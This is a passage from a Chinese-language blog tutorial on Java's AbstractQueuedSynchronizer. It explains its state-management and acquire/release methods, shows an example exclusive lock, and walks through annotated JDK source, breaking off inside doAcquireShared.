怎么用？</h3><p>AQS的实现方式是继承：子类通过继承同步器并实现它的抽象方法来管理同步状态。</p><p>AQS支持独占式地获取同步状态与共享式地获取同步状态</p><p>其实AQS的精髓就在于它简化了锁的实现方式，我们不需要关心同步状态管理、线程排队、等待与唤醒等底层操作逻辑，我们只需要将精力放在锁的核心功能：加锁与解锁。</p><p>可以这样理解：</p><ul><li>锁是面向使用者的，它定义了使用者与锁交互的接口，隐藏了实现细节</li><li>AQS是面向锁的实现者，它定义了锁的实现者与同步器交互的接口，隐藏了实现细节</li></ul><p>之后会写一个实战案例去用AQS实现一个锁。</p><h2 id="2-AQS方法简述"><a href="#2-AQS方法简述" class="headerlink" title="2. AQS方法简述"></a>2. AQS方法简述</h2><p>下面三个方法是用于管理同步状态</p><ol><li><code>getState()</code>：用于获取同步状态</li><li><code>setState(int newState)</code>：用于设置同步状态</li><li><code>compareAndSetState(int expect, int update)</code>：使用CAS设置同步状态，保证原子性</li></ol><p>之前第一部分提到：AQS已经帮我们实现了队列的维护逻辑，我们实现锁时只需要重写获取锁的方法</p><ol><li><code>tryAcquire(int arg)</code>：独占式地获取同步状态，返回值为布尔类型，true为获取成功，false为获取失败。</li><li><code>tryRelease(int arg)</code>：独占式地释放同步状态，返回值为布尔类型，true为释放成功，false为释放失败。</li><li><code>tryAcquireShared(int arg)</code>：共享式地获取同步状态，返回值为int类型。<ul><li>返回0表示成功，且没有剩余资源</li><li>返回大于0的值表示成功，仍有剩余资源</li><li>返回负数代表获取失败</li></ul></li><li><code>tryReleaseShared(int arg)</code>：共享式地释放同步状态，返回值为布尔类型。<ul><li>如果释放后允许唤醒后续等待节点时，返回true；否则返回false</li></ul></li><li><code>isHeldExclusively()</code>：当前同步器是否被线程独占</li></ol><p>通过对于这些方法进行简单理解，便能初步体会到：</p><ul><li><p>当同步状态state为0时，其他线程才有可能获取到同步状态，即获取到锁。</p></li><li><p>对于可重入锁，当线程独占锁之后，会将同步状态state进行自增。如果该线程一直重复地获取该锁，则state会一直累加；该线程去释放该锁时，必须将state自减到0，才算是完全释放成功。</p></li></ul><h2 id="3-AQS实战案例"><a href="#3-AQS实战案例" class="headerlink" title="3. AQS实战案例"></a>3. AQS实战案例</h2><p>通过使用AQS，简单地实现一个独占不可重入锁，也就是说该锁的state只有0与1两种状态。</p><p>重点关注继承自AQS的Sync内部类，这里面自定义了获取同步状态与释放同步状态的核心逻辑。</p><p>这个案例印证了这句话：AQS是面向锁的实现者，它定义了锁的实现者与同步器交互的接口，隐藏了实现细节</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ExclusiveLock</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Lock</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractQueuedSynchronizer</span> &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> &#123;<br>            <span class="hljs-comment">// 当通过CAS设置state为1时，代表加锁成功</span><br>            <span class="hljs-keyword">if</span> (compareAndSetState(<span class="hljs-number">0</span> ,<span class="hljs-number">1</span>)) &#123;<br>                setExclusiveOwnerThread(Thread.currentThread());<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryRelease</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> &#123;<br>            <span class="hljs-comment">// 释放锁时如果发现该锁已被释放，说明有异常</span><br>            <span class="hljs-keyword">if</span> (getState() == <span class="hljs-number">0</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>();<br>            setExclusiveOwnerThread(<span class="hljs-literal">null</span>);<br>            setState(<span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// 当state==1时表示处于占用状态</span><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isHeldExclusively</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> getState() == <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> Condition <span class="hljs-title function_">newCondition</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionObject</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Sync</span> <span class="hljs-variable">sync</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sync</span>();<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">()</span> &#123;<br>        sync.acquire(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lockInterruptibly</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>        sync.acquireInterruptibly(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> sync.tryAcquire(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">(<span class="hljs-type">long</span> time, TimeUnit unit)</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>        <span class="hljs-keyword">return</span> sync.tryAcquireNanos(<span class="hljs-number">1</span>, unit.toNanos(time));<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unlock</span><span class="hljs-params">()</span> &#123;<br>        sync.release(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Condition <span class="hljs-title function_">newCondition</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> sync.newCondition();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-AQS源码详解"><a href="#4-AQS源码详解" class="headerlink" title="4. AQS源码详解"></a>4. AQS源码详解</h2><h3 id="4-1-同步队列"><a href="#4-1-同步队列" class="headerlink" title="4.1 同步队列"></a>4.1 同步队列</h3><p>之前提到，同步器通过同步队列实现了对于线程与同步状态的管理。</p><p>进一步解释：</p><ol><li>当当前线程获取同步状态（锁）失败时，同步器会将当前线程构造为一个节点Node，并加入到同步队列中，阻塞当前线程</li><li>当同步状态（锁）被释放后，会将队列首节点线程唤醒，然后使该线程再次去尝试获取同步状态</li></ol><p>如下图所示：<code>head</code> 指向当前队列的头节点，其已获取到同步状态（锁）。</p><p>获取同步状态失败的节点，会将其依次添加到队列中，<code>tail</code> 维护尾节点。</p><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221017231708935.png" alt="image-20221017231708935"></p><p>队列节点状态：</p><ol><li>CANCELLED(1)：值为1，表示当前节点由于等待超时或被中断，需要取消等待，节点进入该状态后将不会再变化。</li><li>SIGNAL(-1)：值为-1，表示后继节点线程处于等待状态，等待当前节点唤醒。</li><li>CONDITION(-2)：值为-2，表示节点等待在Condition上，如果其他线程对Condition调用了signal方法后，CONDITION状态的节点会从等待队列转移到同步队列中。</li><li>PROPAGATE(-3)：值为-3，共享模式下，前继结点不仅会唤醒其后继结点，同时也可能会唤醒后继的后继结点。</li><li>INITIAL(0)：值为0，代表初始状态</li></ol><p>观察节点状态发现：负值表示处于有效等待状态，而正值表示节点已被取消。</p><h3 id="4-2-独占式获取"><a href="#4-2-独占式获取" class="headerlink" title="4.2 独占式获取"></a>4.2 独占式获取</h3><p>核心方法为 <code>acquire()</code> ，如下所示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">acquire</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!tryAcquire(arg) &amp;&amp;<br>        acquireQueued(addWaiter(Node.EXCLUSIVE), arg))<br>        selfInterrupt();<br>&#125;<br></code></pre></td></tr></table></figure><p>而该方法又由 <code>tryAcquire</code> 、 <code>acquireQueued</code> 与 <code>addWaiter</code>  三个方法组成。</p><p>这里先给出该方法的执行流程：</p><ol><li>调用 <code>tryAcquire</code> 方法尝试去获取同步状态，其返回值为boolean类型：<ul><li>若返回True，代表获取同步状态成功。而其取反后，为False，该方法便到此为止了，直接返回</li><li>若返回False，代表获取同步状态失败，取反后为True，则需要进一步执行之后的方法</li></ul></li><li><code>tryAcquire</code> 返回False之后，继续执行 <code>addWaiter</code> 方法，构造同步节点，并通过该方法，将构造好的Node节点以独占模式加入到队列的尾部</li><li><code>acquireQueued</code> 方法使得该节点以死循环方式获取同步状态，一直到获取到才返回<ul><li>如果在死循环的过程中被中断过，则返回True，否则返回False</li></ul></li><li>如果线程节点在等待过程中被中断，是不会响应的。只有等到获取到同步状态后，才会执行 <code>selfInterrupt</code> 方法</li></ol><p>接着，一起来看一看这三个核心方法的源码</p><ul><li><p><code>tryAcquire</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>这个核心方法竟然只有一行代码，而且是抛出异常的代码。如果只看源码，确实很让人疑惑。</p><p>但是结合之前第一部分的内容以及实战案例：我们在实现一个锁时，需要在锁的内部创建一个内部类，并让其继承AQS，重写AQS中的核心方法。而这些核心方法中就包括 <code>tryAcquire</code>。这个获取同步状态（锁）的逻辑需要我们自己实现。</p><p>这也就进一步解释了：AQS简化了锁的实现方式，我们不需要关心同步状态管理、线程排队、等待与唤醒等底层操作逻辑，我们只需要将精力放在锁的核心功能加锁与解锁。</p></li><li><p><code>addWaiter</code>：直接看注释</p><p>其中if块中执行的内容就是将当前节点添加队列尾部</p><ul><li><p>注意需要使用 <code>compareAndSetTail</code> 方法来确保节点以线程安全的方式被添加到尾部。</p><p>如果仅使用简单的LinkedList来处理节点关系，则会导致多个线程并发地被添加到链表中，造成节点数量和顺序混乱。</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Node <span class="hljs-title function_">addWaiter</span><span class="hljs-params">(Node mode)</span> &#123;<br>    <span class="hljs-comment">// 将当前线程构造为同步队列中的节点</span><br>    <span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(Thread.currentThread(), mode);<br>    <span class="hljs-comment">// 获取尾结点，tail为AQS类的成员变量</span><br>    <span class="hljs-type">Node</span> <span class="hljs-variable">pred</span> <span class="hljs-operator">=</span> tail;<br>    <span class="hljs-comment">// 若尾节点不为空</span><br>    <span class="hljs-keyword">if</span> (pred != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// 将当前节点的prev设为尾结点</span><br>        node.prev = pred;<br>        <span class="hljs-comment">// 将当前节点设置为新的尾结点</span><br>        <span class="hljs-keyword">if</span> (compareAndSetTail(pred, node)) &#123;<br>            <span class="hljs-comment">// 将旧的尾结点的next设为当前节点</span><br>            pred.next = node;<br>            <span class="hljs-keyword">return</span> node;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 若尾节点为空，则调用enq自旋进行入队列操作</span><br>    enq(node);<br>    <span class="hljs-keyword">return</span> node;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p><code>enq</code>：直接看注释</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Node <span class="hljs-title function_">enq</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Node node)</span> &#123;<br>    <span class="hljs-comment">// 这是一种自旋方式。一直自旋，直到Node被添加到队尾</span><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-comment">// 获取当前队列的尾结点</span><br>        <span class="hljs-type">Node</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> tail;<br>        <span class="hljs-keyword">if</span> (t == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">// 如果tail为空，表示队列为空，需要新创建一个空节点作为head与tail节点</span><br>            <span class="hljs-keyword">if</span> (compareAndSetHead(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>()))<br>                tail = head;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 如果tail不为空，说明队列中存在线程节点，进行入队列操作</span><br>            node.prev = t;<br>            <span class="hljs-keyword">if</span> (compareAndSetTail(t, node)) &#123;<br>                t.next = node;<br>                <span class="hljs-keyword">return</span> t;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里需要注意的是：当 <code>addWaiter</code> 中尾结点为空时，又调用了 <code>enq</code> 方法以自旋方式添加节点，这样可以保证节点被添加成功</p></li></ul></li><li><p><code>acquireQueued</code>：直接看注释</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">acquireQueued</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Node node, <span class="hljs-type">int</span> arg)</span> &#123;<br>    <span class="hljs-comment">// failed表示是否获取同步状态（锁）失败</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">failed</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// interrupted表示在获取过程中是否被打断</span><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">interrupted</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">for</span> (;;) &#123;<br>            <span class="hljs-comment">// 通过node.predecessor()拿到其前驱节点</span><br>            <span class="hljs-keyword">final</span> <span class="hljs-type">Node</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> node.predecessor();<br>            <span class="hljs-comment">// 如果前驱节点为头节点head，代表当前节点可以尝试去获取同步状态（锁）</span><br>            <span class="hljs-keyword">if</span> (p == head &amp;&amp; tryAcquire(arg)) &#123;<br>                <span class="hljs-comment">// 如果获取成功，则当前节点成为新的头节点head</span><br>            <span class="hljs-comment">// setHead方法会将当前节点的prev设置为null</span><br>                setHead(node);<br>                <span class="hljs-comment">// 将旧的头节点的next设置为null，有助于gc回收旧的head节点</span><br>                p.next = <span class="hljs-literal">null</span>; <br>                <span class="hljs-comment">// 代表成功获取到同步状态（锁）</span><br>                failed = <span class="hljs-literal">false</span>;<br>                <span class="hljs-comment">// 返回是否被中断</span><br>                <span class="hljs-keyword">return</span> interrupted;<br>            &#125;<br>            <span class="hljs-comment">// 如果当前线程节点可以休息，那就进入等待状态，直至被unpark</span><br>            <span class="hljs-keyword">if</span> (shouldParkAfterFailedAcquire(p, node) &amp;&amp;<br>                parkAndCheckInterrupt())<br>                <span class="hljs-comment">// 如果等待过程被中断，则标记为true</span><br>                interrupted = <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-comment">// 如果等待过程中没有成功获取到同步状态（被中断或超时），则将该线程节点设置为CANCELLED状态</span><br>        <span class="hljs-keyword">if</span> (failed)<br>            cancelAcquire(node);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>shouldParkAfterFailedAcquire：该方法用于检查状态，判断当前线程节点的前驱节点是否仍然有效。看注释</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">shouldParkAfterFailedAcquire</span><span class="hljs-params">(Node pred, Node node)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">ws</span> <span class="hljs-operator">=</span> pred.waitStatus;<br>    <span class="hljs-comment">// 前驱节点状态有效，返回true，当前线程节点便可进入等待状态，等待唤醒</span><br>    <span class="hljs-keyword">if</span> (ws == Node.SIGNAL)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-comment">// 前驱节点状态大于0，说明无效。</span><br>    <span class="hljs-keyword">if</span> (ws &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// while循环继续寻找前驱节点之前的有效节点</span><br>        <span class="hljs-keyword">do</span> &#123;<br>            node.prev = pred = pred.prev;<br>        &#125; <span class="hljs-keyword">while</span> (pred.waitStatus &gt; <span class="hljs-number">0</span>);<br>        <span class="hljs-comment">// 将当前线程节点排到有效节点的后面</span><br>        pred.next = node;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 如果前驱节点有效，将其状态以CAS方式设置为SIGNAL，以便于释放同步状态后通知当前线程节点</span><br>        compareAndSetWaitStatus(pred, ws, Node.SIGNAL);<br>    &#125;<br>    <span class="hljs-comment">// 返回false，在acquireQueued方法内继续自旋检查状态</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>parkAndCheckInterrupt：该方法用于进入等待状态</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">parkAndCheckInterrupt</span><span class="hljs-params">()</span> &#123;<br>    LockSupport.park(<span class="hljs-built_in">this</span>);<br>    <span class="hljs-keyword">return</span> Thread.interrupted();<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ul><h3 id="4-3-独占式释放"><a href="#4-3-独占式释放" class="headerlink" title="4.3 独占式释放"></a>4.3 独占式释放</h3><p>release方法用于释放同步状态，并且会唤醒当前线程节点的后继节点，使得后继节点尝试去获取同步状态。源码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">release</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> &#123;<br>    <span class="hljs-keyword">if</span> (tryRelease(arg)) &#123;<br>        <span class="hljs-type">Node</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> head;<br>        <span class="hljs-keyword">if</span> (h != <span class="hljs-literal">null</span> &amp;&amp; h.waitStatus != <span class="hljs-number">0</span>)<br>            <span class="hljs-comment">// 唤醒后继节点</span><br>            unparkSuccessor(h);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>其中tryRelease的设计模式与tryAcquire一样，均需要我们自己去实现</p></li><li><p>unparkSuccessor：唤醒后继节点</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unparkSuccessor</span><span class="hljs-params">(Node node)</span> &#123;<br>    <span class="hljs-comment">// node为当前线程节点，获取其状态</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">ws</span> <span class="hljs-operator">=</span> node.waitStatus;<br>    <span class="hljs-comment">// 如果状态小于0，需要将其置为0（从有效到无效），该过程允许失败</span><br>    <span class="hljs-keyword">if</span> (ws &lt; <span class="hljs-number">0</span>)<br>        compareAndSetWaitStatus(node, ws, <span class="hljs-number">0</span>);<br>    <span class="hljs-comment">// 获取当前节点的后继节点，一般节点不为空且有效</span><br>    <span class="hljs-type">Node</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> node.next;<br>    <span class="hljs-comment">// 但如果该节点为空或无效（处于CANCELLED状态），则需要找到有效节点</span><br>    <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">null</span> || s.waitStatus &gt; <span class="hljs-number">0</span>) &#123;<br>        s = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">Node</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> tail; t != <span class="hljs-literal">null</span> &amp;&amp; t != node; t = t.prev)<br>            <span class="hljs-keyword">if</span> (t.waitStatus &lt;= <span class="hljs-number">0</span>)<br>                s = t;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (s != <span class="hljs-literal">null</span>)<br>        LockSupport.unpark(s.thread);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="4-4-共享式获取"><a href="#4-4-共享式获取" class="headerlink" title="4.4 共享式获取"></a>4.4 共享式获取</h3><p>先来看看共享式与独占式地获取同步状态的区别：</p><ul><li>在同一时刻，共享式获取允许多个线程同时获取到同步状态，而独占式则只有一个线程可以获取到，其他线程均阻塞</li></ul><p>共享式获取的一个经典应用便是Semaphore，其作用为控制同时访问某一特定资源的线程数量。</p><p>因此，在接下来的解释中，用 <code>资源</code> 代替 <code>同步状态</code>。</p><p>调用acquireShared方法共享式地获取资源</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">acquireShared</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> &#123;<br>    <span class="hljs-keyword">if</span> (tryAcquireShared(arg) &lt; <span class="hljs-number">0</span>)<br>        doAcquireShared(arg);<br>&#125;<br></code></pre></td></tr></table></figure><p>其中tryAcquireShared需要我们自己去手动实现，但是返回结果类型已经被定义好了：</p><ul><li>返回负数时，代表获取失败，剩余资源不足</li><li>返回非负数时，代表获取成功。如果为0，说明已没有剩余资源了；如果为正数，则代表还有剩余资源。</li></ul><p>当为负数时，需要调用doAcquireShared方法，进入等待队列，直到获取到资源时才返回。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doAcquireShared</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> &#123;<br>    <span class="hljs-comment">// 将当前线程节点添加到队列尾部</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> addWaiter(Node.SHARED);<br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">failed</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">interrupted</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-comment">// 自旋重复尝试获取资源</span><br>        <span class="hljs-keyword">for</span> (;;) &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">Node</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> node.predecessor();<br>            <span class="hljs-comment">// 